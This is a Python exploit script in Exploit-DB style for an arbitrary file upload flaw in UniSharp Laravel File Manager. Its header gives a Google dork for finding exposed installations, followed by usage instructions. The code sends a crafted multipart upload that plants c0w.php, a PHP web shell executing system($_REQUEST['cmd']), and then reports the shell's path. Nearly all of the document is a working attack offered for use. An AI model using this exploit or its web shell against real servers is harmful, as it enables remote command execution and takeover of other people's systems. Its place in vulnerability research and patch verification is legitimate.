### Exploit Title: UniSharp Laravel File Manager - Arbitrary File Upload
##
## Google Dork: inurl:"laravel-filemanager?type=Files" -site:github.com -site:github.io
## Exploit Author: Mohammad Danish
## Vendor Homepage: https://github.com/UniSharp/laravel-filemanager
## Software Link: https://github.com/UniSharp/laravel-filemanager
## Version: v2.0.0-alpha7 & v.2.0
## 
##  Exploit: UniSharp Laravel File Manager - Arbitrary File Upload
##  Reference: https://github.com/UniSharp/laravel-filemanager/issues/356
##
##
##  Issue Description:
##    Larvel File Manager by UniSharp allows Arbitrary File Upload if type is set to Files /laravel-filemanager?type=Files
##
##*********************
##IMPORTANT READ
##*********************
##  Code is not good written, as I just started learning python
##
##**********************
##  [!!] USAGE: exploit.py <target-ip> <target-port> <laravel_session Cookie>
##  [!!] USAGE: exploit.py 192.168.100.12 8080 eyJpdiI6IlplemdVaG9FSm9MaXJobEgrYlwvSkhnPT0iLCJ2YWx1ZSI6IkhrZ2R1O..........<YOUR SESSION ID HERE>
##-----------------------
##


import socket
import sys

def exploit(host,port,sessionId):

    req = ""
    req += "POST /laravel-filemanager/upload HTTP/1.1\r\n"
    req += "Host: "+host+":"+port+"\r\n" 
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0\r\n"
    req += "Accept: */*\r\n"
    req += "Accept-Language: en-US,en;q=0.5\r\n"
    req += "Accept-Encoding: gzip, deflate\r\n"
    req += "X-Requested-With: XMLHttpRequest\r\n"
    req += "Referer: http://"+host+":"+port+"/laravel-filemanager?type=Files\r\n"
    req += "Content-Length: 527\r\n"
    req += "Content-Type: multipart/form-data; boundary=---------------------------12194679330849\r\n"
    req += "Cookie:laravel_session="+sessionId+"\r\n"
    req += "Connection: keep-alive\r\n"
    req += "\r\n"
    req += "\r\n"

    req += "-----------------------------260082409123824\r\n"
    req += 'Content-Disposition: form-data; name="upload[]"; filename="c0w.php"\r\n'
    req += 'Content-Type: text/plain\r\n\r\n'

    req += 'Happy Hacking!!\r\n'
    req += "<?\r\n"
    req += "system($_REQUEST['cmd']);\r\n"
    req += "?>\r\n"
    req += "-------------------\r\n"
    req += "-----------------------------260082409123824\r\n"
    req += 'Content-Disposition: form-data; name="working_dir"\r\n'
    req += "/1\r\n"
    req += "-----------------------------260082409123824\r\n"
    req += 'Content-Disposition: form-data; name="type"\r\n'

    req += "Files\r\n"
    req += "-----------------------------260082409123824\r\n"
    req += 'Content-Disposition: form-data; name="_token"\r\n'

    req += "MU5XhVxbrkRnkVJFUHCjdfNSVTKm3qro6OgtWXjy\r\n"
    req += "-----------------------------260082409123824--\r\n"

    s = socket.socket()
    int_port = int(port)
    s.connect((host,int_port))
##    print req
    s.send(req)
    response = s.recv(1024)
    magic = response[-10:]
    if "OK" in magic:
        print "[!] Your shell Uploaded successfully to directory /1/c0w.php"
    else:
        print "[!] Either the server is not vulnerable OR \r\n1) Check your laravel_session cookie \r\n2) Change working_dir in this exploit \r\n3) Check _token"
    


host = sys.argv[1]
port = sys.argv[2]
sessionId = sys.argv[3]
exploit(host,port,sessionId)